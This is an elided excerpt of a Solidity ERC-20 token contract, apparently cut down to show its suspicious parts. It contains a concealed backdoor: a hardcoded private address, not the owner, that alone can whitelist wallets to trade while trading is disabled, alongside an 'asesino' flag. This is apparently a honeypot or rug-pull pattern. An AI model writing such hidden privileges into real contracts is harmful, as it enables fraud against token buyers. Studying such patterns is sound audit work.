...
contract Test is IERC20, Ownable {
    ...
    string public constant _symbol = "TES";
    uint8 public constant _decimals = 9;
    uint256 public constant InitialSupply = 1 * 10**12 * 10**_decimals;

    uint256 swapLimit = 1 * 10**12 * 10**_decimals;
    ...
    mapping(address => bool) isAuthy;

    address public constant UniswapRouter =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant agentProvocateur = 0x4BD1F785e1Ac86F3B05706714650EbCd12EEc8Ab;
    ...
    function _isAuthy(address addr) private view returns (bool) {
        return addr == owner() || isAuthy[addr];
    }
    ...
    function _transfer(
        ...
        if (
            ...
            if (!tradingEnabled) {
                if ( (sender != owner() && recipient != owner()) || (!isAuthy[sender] && !isAuthy[recipient])) {
                        if(asesino) {
    ...
    function AccesoAprovado(address[] memory addy, bool booly) external {
        require (msg.sender == agentProvocateur);
         for (uint i = 0; i < addy.length; i++) {
        isAuthy[addy[i]] = booly;
    }
    }
